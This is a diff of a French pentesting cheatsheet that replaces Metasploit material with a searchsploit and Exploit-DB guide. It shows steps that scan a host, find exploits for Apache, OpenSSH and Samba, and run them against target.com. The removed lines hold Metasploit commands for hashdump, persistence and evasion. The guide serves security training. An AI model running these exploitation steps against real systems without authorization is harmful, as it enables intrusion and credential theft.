+echo "[+] All exploits copied!"
+```
+
+### Script de recherche CVE
+
+```bash
+#!/bin/bash
+# cve-search.sh
+
+CVE_LIST="cve_list.txt"
+
+while read cve; do
+    echo "[*] Searching $cve"
+    searchsploit $cve | grep -v "Exploit Title" | grep -v "^---"
+done < $CVE_LIST
+```
+
+---
+
+## 1️⃣4️⃣ Astuces et Best Practices
+
+### Recherche efficace
+
+```bash
+# 1. Toujours commencer large
+searchsploit apache
+
+# 2. Affiner progressivement
+searchsploit apache 2.4
+
+# 3. Ajouter le type si trop de résultats
+searchsploit apache 2.4 --remote
+
+# 4. Vérifier le CVE
+searchsploit CVE-2021-41773
+```
+
+### Vérification de l'exploit
+
+```bash
+# Toujours examiner l'exploit avant utilisation
+searchsploit -x 50383
+
+# Vérifier :
+# - Version cible compatible
+# - Type d'exploit (remote/local)
+# - Requirements (modules Python, etc.)
+# - Instructions d'utilisation
+# - Payload et actions effectuées
+```
+
+### Organisation
+
+```bash
+# Créer un dossier par cible
+mkdir target_exploits
+cd target_exploits
+
+# Copier les exploits
+searchsploit -m 50383 50384
+
+# Renommer pour clarté
+mv 50383.py apache_rce.py
+mv 50384.py smb_exploit.py
+```
+
+---
+
+## 1️⃣5️⃣ Exploitation Multi-Services
+
+### Scan complet et exploitation
+
+```bash
+# 1. Scan Nmap complet
+nmap -sV -sC -p- target.com -oA target_scan
+
+# 2. Recherche automatique
+searchsploit --nmap target_scan.xml > exploits.txt
+
+# 3. Analyser les résultats
+cat exploits.txt
+
+# 4. Pour chaque service vulnérable :
+
+# Apache
+searchsploit "apache 2.4.49" -m 50383
+python 50383.py target.com
+
+# SSH (si version ancienne)
+searchsploit "openssh 7.4" -m 45233
+python 45233.py target.com
+
+# SMB
+searchsploit "samba 4.5" -m 45886
+python 45886.py target.com
+```
+
+---
+
+## 1️⃣6️⃣ Base de Données Locale
+
+### Structure
+
+```bash
+# Emplacement de la base
+/usr/share/exploitdb/
+
+# Structure
+exploitdb/
+├── exploits/          # Exploits classés par plateforme
+├── shellcodes/        # Shellcodes
+├── papers/            # Papers techniques
+└── files.csv          # Index de recherche
+```
+
+### Recherche manuelle
+
+```bash
+# Parcourir manuellement
+ls /usr/share/exploitdb/exploits/linux/remote/
+
+# Grep dans files.csv
+grep -i "apache" /usr/share/exploitdb/files.csv
+
+# Trouver exploits récents
+find /usr/share/exploitdb/exploits/ -type f -mtime -30
 ```
 
 ---
 
 ## 1️⃣7️⃣ Cheatsheet Rapide
 
-### Workflow d'exploitation
-
-```bash
-# 1. Recherche
-search cve:2021-41773
-
-# 2. Utiliser module
-use exploit/multi/http/apache_normalize_path_rce
-
-# 3. Options
-show options
-set RHOSTS target.com
-set LHOST 192.168.1.50
-
-# 4. Check
-check
-
-# 5. Exploit
-exploit
-
-# 6. Post-exploitation (si Meterpreter)
-sysinfo
-hashdump
-screenshot
-```
-
 ### Commandes essentielles
 
 ```bash
-# Recherche
-search [term]
-search type:exploit platform:windows
+# Recherche simple
+searchsploit service_name
 
-# Module
-use [module]
-info
-show options
-set [option] [value]
+# Avec version
+searchsploit "service version"
 
-# Exploitation
-check
-exploit / run
-exploit -j  # Background
+# Par CVE
+searchsploit CVE-2021-XXXXX
 
-# Sessions
-sessions
-sessions -i [id]
-sessions -u [id]  # Upgrade
+# Remote exploits
+searchsploit service --remote
 
-# Database
-workspace
-hosts
-services
-vulns
-creds
+# Examiner
+searchsploit -x EDB_ID
 
-# Meterpreter
-sysinfo
-getuid
-ps
-migrate
-hashdump
-screenshot
+# Copier
+searchsploit -m EDB_ID
+
+# Depuis Nmap
+searchsploit --nmap scan.xml
+
+# Update
+searchsploit -u
+
+# JSON output
+searchsploit service --json
+
+# Chemin complet
+searchsploit -p EDB_ID
 ```
 
 ---
@@ -973,34 +758,36 @@ screenshot
 ## 1️⃣8️⃣ Ressources
 
 ### Documentation
-- Metasploit Unleashed : https://www.metasploitunleashed.com/
-- Rapid7 Docs : https://docs.rapid7.com/metasploit/
-- GitHub : https://github.com/rapid7/metasploit-framework
+- Exploit-DB : https://www.exploit-db.com/
+- GitHub : https://github.com/offensive-security/exploitdb
+- Searchsploit Manual : `man searchsploit`
 
-### Modules
-- Exploit Database : https://www.exploit-db.com/
-- Metasploit Modules : https://www.rapid7.com/db/modules/
+### Alternatives
+- Metasploit Database : `msfconsole > search`
+- PacketStorm : https://packetstormsecurity.com/
+- 0day.today : https://0day.today/
+- GitHub : Recherche de PoCs
 
-### Formation
-- Offensive Security : Metasploit courses
-- TryHackMe : Metasploit rooms
-- HackTheBox : Practice labs
+### Bases CVE
+- CVE Details : https://www.cvedetails.com/
+- NVD : https://nvd.nist.gov/
+- MITRE CVE : https://cve.mitre.org/
 
 ---
 
 ## 💡 Tips Pro
 
-1. **Toujours check** avant exploit
-2. **Workspace par projet** pour organisation
-3. **Resource scripts** pour automatisation
-4. **Global variables** pour configs répétitives
-5. **Multi-handler** en background pour payloads
-6. **Migrate process** dès connexion Meterpreter
-7. **Hashdump** immédiatement après admin
-8. **AutoRoute** pour pivoting
-9. **Persistence** pour accès long terme
-10. **HTTPS payloads** pour évasion
+1. **Toujours mettre à jour** : `searchsploit -u`
+2. **Examiner avant copie** : `searchsploit -x`
+3. **Depuis Nmap** : `--nmap` pour automatisation
+4. **Filtrer par type** : `--remote` pour exploits distants
+5. **JSON output** : parsing automatisé avec `jq`
+6. **CVE lookup** : Toujours vérifier le CVE
+7. **Metasploit check** : Chercher si module MSF existe
+8. **Tester localement** avant exploitation
+9. **Backup exploits** : Copier dans dossier projet
+10. **Lire le code** : Comprendre avant exécuter
 
 ---
 
-**💥 Metasploit est l'outil d'exploitation le plus puissant. Framework complet pour pentest professionnel !**
+**🔎 Searchsploit est l'outil de recherche d'exploits le plus rapide. Base de données offline de 40,000+ exploits !**
